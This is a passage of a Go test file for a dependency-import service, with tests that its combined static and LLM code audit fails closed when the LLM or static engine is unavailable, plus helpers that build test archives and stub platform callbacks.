	if err := os.MkdirAll(depsDir, 0o755); err != nil {
		t.Fatalf("seed dir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(depsDir, "pkg.py"), []byte(benignPython), 0o644); err != nil {
		t.Fatalf("seed file: %v", err)
	}
	return depsDir
}

// TestRunCombinedAuditLLMUnavailableFailsClosed pins the LLM-unavailable branch of
// runCombinedAudit (combined_audit.go): with the LLM enabled and fail-closed, an unreachable
// service must leave the delivered side implicated -- the fail-closed direction -- rather than
// silently degrading to a static-only scan that lets it through, and the report must carry code=2
// with scope=deps.
//
// The branch is decided before GenerateAuditReport is reached, so the engine is left at the
// fixture default on purpose: it cannot influence this outcome, and setting it would only suggest
// it could.
func TestRunCombinedAuditLLMUnavailableFailsClosed(t *testing.T) {
	state, _ := setupTestState(t)
	// runCombinedAudit reads ScanEnabled itself, so it must be on for the probe to be reached.
	state.Security.ScanEnabled = true

	// A server closed before use refuses connections immediately, so the fail-closed health probe
	// returns without waiting out its budget.
	llmDown := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {}))
	llmDown.Close()
	state.Security.LLM = codeaudit.LLMConfig{
		Enabled:    true,
		FailClosed: true,
		Endpoint:   llmDown.URL,
		Model:      "qwen2.5-coder:0.5b",
	}

	depsDir := seedCleanDepsDir(t, state, "llm-unavailable")
	received := captureCombinedAuditReports(t, state)

	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-llm", TaskID: "task-llm"}, codeAuditTriggerDeps, depsDir)

	if result.TriggerClean {
		t.Fatal("TriggerClean = true while the LLM was unavailable and fail-closed")
	}
	if _, err := os.Stat(depsDir); err != nil {
		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
	}

	rr := waitForCombinedAuditReport(t, received)
	if rr.Code != 2 {
		t.Fatalf("code = %d, want 2 (LLM unavailable, fail-closed)", rr.Code)
	}
	if rr.Scope != "deps" {
		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
	}
	requireNoCombinedAuditReport(t, received)
}

// TestRunCombinedAuditEngineErrorFailsClosed pins the engine-error branch of runCombinedAudit
// (combined_audit.go): a nil engine is a configuration the audit refuses, and that refusal must
// implicate the delivered side and be reported exactly like an LLM failure -- code=2 with
// scope=deps.
//
// GenerateAuditReport returns "static engine is not configured" for a nil engine rather than
// dereferencing it (internal/codeaudit/verifier.go), so this reaches the error branch instead of
// panicking.
func TestRunCombinedAuditEngineErrorFailsClosed(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = true
	// Keep the LLM out of the way: with it disabled the engine is the only thing left that can
	// fail, which is what makes this test drive the engine-error branch rather than the one above.
	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
	state.Security.Engine = nil

	depsDir := seedCleanDepsDir(t, state, "engine-missing")
	received := captureCombinedAuditReports(t, state)

	result := state.runCombinedAudit(codeAuditRequest{RequestID: "req-eng", TaskID: "task-eng"}, codeAuditTriggerDeps, depsDir)

	if result.TriggerClean {
		t.Fatal("TriggerClean = true with no static engine configured")
	}
	if _, err := os.Stat(depsDir); err != nil {
		t.Fatalf("the executor removed the delivered directory: %v (clearing is the caller's job)", err)
	}

	rr := waitForCombinedAuditReport(t, received)
	if rr.Code != 2 {
		t.Fatalf("code = %d, want 2 (engine error, fail-closed)", rr.Code)
	}
	if rr.Scope != "deps" {
		t.Fatalf("scope = %q, want \"deps\"", rr.Scope)
	}
	requireNoCombinedAuditReport(t, received)
}

// TestStatusReportsDepsState pins the two dependency fields of the /v1/taa/status envelope:
// after a successful dependency import the response must report depsImported=true and the
// content-address depsHash, so a caller can tell whether the training environment will receive a
// dependency layer. Mutating either JSON key name drops that field and fails this test.
func TestStatusReportsDepsState(t *testing.T) {
	state, server := setupTestServer(t)
	state.saveDepsSuccess("cafebabe", map[string]any{"size": int64(5), "algorithm": "sm3", "value": "cafebabe"})

	resp := postJSON(t, server.URL+"/v1/taa/status", map[string]any{})
	api := decodeResponse(t, resp)

	result, ok := api.Result.(map[string]any)
	if !ok {
		t.Fatalf("result is not an object: %#v", api.Result)
	}
	if result["depsImported"] != true {
		t.Fatalf("depsImported = %v, want true", result["depsImported"])
	}
	if result["depsHash"] != "cafebabe" {
		t.Fatalf("depsHash = %v, want cafebabe", result["depsHash"])
	}
}

// rollbackDepsImport's own two branches are NOT unit-tested here: Task 6's pipeline tests reach
// both through real call sites -- TestProcessImportedDepsInstallFailureKeepsWorkingBinding (a
// non-bound directory is removed, the working binding is kept) and
// TestProcessImportedDepsInstallFailureClearsBindingWhenItsDirectoryIsGone (the bound directory
// is removed, so the binding is cleared). Asserting the same invariant a second time at the unit
// level would only add another place to forget to update.

// ── test helpers ─────────────────────────────────────────

// captureAuditAndDepsReports points state at one platform stub that routes both callbacks a
// dependency delivery can produce: reportAudit (the combined audit) and reportDeps (the
// delivery's own outcome). Both are addressed to state.PlatformIP, so a test that needs both
// -- the divergence between them is the whole point of the dependency trigger -- cannot use
// two servers, and captureCombinedAuditReports alone would drop the reportDeps side.
//
// It returns the two channels; every other path is answered with an OK envelope and dropped,
// the same way TestProcessImportedDepsReportsFailureCodeToPlatform routes its stub.
func captureAuditAndDepsReports(t *testing.T, state *TAAState) (<-chan combinedAuditCapture, <-chan map[string]any) {
	t.Helper()
	auditCh := make(chan combinedAuditCapture, 4)
	depsCh := make(chan map[string]any, 4)
	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case reportAuditEndpoint:
			var rr combinedAuditCapture
			_ = json.NewDecoder(r.Body).Decode(&rr)
			auditCh <- rr
		case reportDepsEndpoint:
			var body map[string]any
			_ = json.NewDecoder(r.Body).Decode(&body)
			depsCh <- body
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"msg":"ok","result":{"received":true},"error":0}`))
	}))
	t.Cleanup(platform.Close)

	state.mu.Lock()
	state.PlatformIP, state.DockerID = platform.URL, "docker-test"
	state.mu.Unlock()
	return auditCh, depsCh
}

// buildTestDepsArchive builds a minimal valid dependency package: requirements.txt plus one
// empty .whl.
func buildTestDepsArchive(t *testing.T) string {
	t.Helper()
	return buildTestArchive(t, map[string]string{
		"requirements.txt":                    "torchvision==0.28.0\n",
		"torchvision-0.28.0-py3-none-any.whl": "not-a-real-wheel\n",
	})
}

// buildTestArchive packs name->content into a tar.gz on disk and returns the file path.
func buildTestArchive(t *testing.T, files map[string]string) string {
	t.Helper()

	path := filepath.Join(t.TempDir(), "deps.tar.gz")
	f, err := os.Create(path)
	if err != nil {
		t.Fatalf("create archive: %v", err)
	}
	defer f.Close()

	gz := gzip.NewWriter(f)
	tw := tar.NewWriter(gz)

	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names) // stable write order, so failures reproduce

	for _, name := range names {
		content := files[name]
		hdr := &tar.Header{
			Name:     name,
			Mode:     0o644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("write header %s: %v", name, err)
		}
		if _, err := tw.Write([]byte(content)); err != nil {
			t.Fatalf("write body %s: %v", name, err)
		}
	}

	if err := tw.Close(); err != nil {
		t.Fatalf("close tar: %v", err)
	}
	if err := gz.Close(); err != nil {
		t.Fatalf("close gzip: %v", err)
	}
	return path
}

// assertDepsRootEmpty asserts that no leftover directory remains under the content-addressed root.
func assertDepsRootEmpty(t *testing.T, state *TAAState) {
	t.Helper()
	entries, err := os.ReadDir(state.Security.GetDepsDir())
	if err != nil {
		t.Fatalf("read deps root: %v", err)
	}
	if len(entries) != 0 {
		t.Fatalf("deps root is not empty, %d leftover entries: %v", len(entries), entries)
	}
}

// assertDepsRootContainsOnly fails unless the deps root holds exactly one entry with the
// given base name. Asserting what remains -- rather than that nothing errored -- is what
// makes the "a failing newcomer must not unseat the working set" tests discriminating.
func assertDepsRootContainsOnly(t *testing.T, state *TAAState, wantName string) {
	t.Helper()
	entries, err := os.ReadDir(state.Security.GetDepsDir())
	if err != nil {
		t.Fatalf("read deps root: %v", err)
	}
	names := make([]string, 0, len(entries))
	for _, e := range entries {
		names = append(names, e.Name())
	}
	if len(names) != 1 || names[0] != wantName {
		t.Fatalf("deps root holds %v, want exactly [%s]", names, wantName)
	}
}
